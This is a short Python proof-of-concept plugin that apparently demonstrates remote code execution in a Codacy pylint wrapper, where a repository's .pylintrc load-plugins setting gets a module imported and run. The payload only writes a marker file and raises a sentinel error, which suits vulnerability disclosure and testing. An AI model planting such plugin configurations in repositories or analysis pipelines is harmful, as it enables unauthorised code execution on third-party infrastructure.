# PoC payload - benign marker only. RCE via codacy-pylint: on the no-patterns branch the wrapper
# passes no --rcfile, so pylint 1.9.5 auto-discovers /src/.pylintrc and importlib.import_module's
# the load-plugins name (codacy_rce). This module (importable because /src is on sys.path) runs.
import os, sys

_marker = "/tmp/codacy-pylint-rce-confirmed.txt"
try:
    with open(_marker, "w") as _f:
        _f.write("RCE confirmed via pylint load-plugins import. cwd=%s marker=%s\n" % (os.getcwd(), _marker))
except Exception:
    pass

# Raise a sentinel assembled from runtime values so execution is observable in the Codacy logs.
raise RuntimeError("CODEX_RCE_PYLINT_PROOF_%s_marker_written_%s" % (os.getcwd(), _marker))
